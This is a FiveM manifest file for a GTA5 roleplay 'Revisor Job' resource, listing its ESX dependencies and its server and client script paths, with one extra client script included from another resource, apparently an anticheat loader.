fx_version      'adamant'
game            'gta5'

author          'Identity - cBeyer'
description     'Revisor Job'
version         '1.0.0'

dependencies {
    'es_extended',
    'mythic_notify',
    'id_notify'
}

server_scripts {
    '@es_extended/locale.lua',
    'locales/*.lua',
    'config.lua',

    'server/*.lua'
}

client_scripts {
    '@es_extended/locale.lua',
    'locales/*.lua',
    'config.lua',

    'client/*.lua'
}
client_script "@esx_drugmoney/acloader.lua"